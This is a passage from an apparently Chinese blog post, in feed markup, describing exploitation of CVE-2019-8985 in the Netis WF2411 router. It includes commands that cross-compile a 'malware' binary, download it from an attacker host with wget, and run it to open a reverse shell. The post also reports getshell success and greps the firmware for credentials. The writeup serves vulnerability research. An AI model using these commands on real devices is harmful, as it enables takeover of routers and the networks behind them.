class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要利用两次漏洞 一次让 malware 可执行 一次让其跑起来（因为长度不够 没法一次性解决）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://10.10.10.2:8000/malware&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x malware&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./malware 10.10.10.2 9999&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击机开启监听&lt;br&gt;
效果如下 成功 getshell&lt;br&gt;
&lt;img src=&#34;/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;未完&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#未完&#34;&gt;#&lt;/a&gt; 未完&lt;/h2&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;➜  squrootfs grep -r &amp;quot;Authorization: Basic &amp;quot; .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/updatedd matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/busybox matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;grep: ./var/run/webs.pid: Permission denied&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;➜  squrootfs grep -r &amp;quot;User-Agent: Real UserAgent&amp;quot; .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;grep: ./var/run/webs.pid: Permission denied&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;➜  squrootfs grep -r &amp;quot;User-Agent: &amp;quot; .              &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/updatedd matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/busybox matches&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="IoT" />
        <updated>2021-08-10T16:00:00.000Z</updated>
    </entry>
</feed>
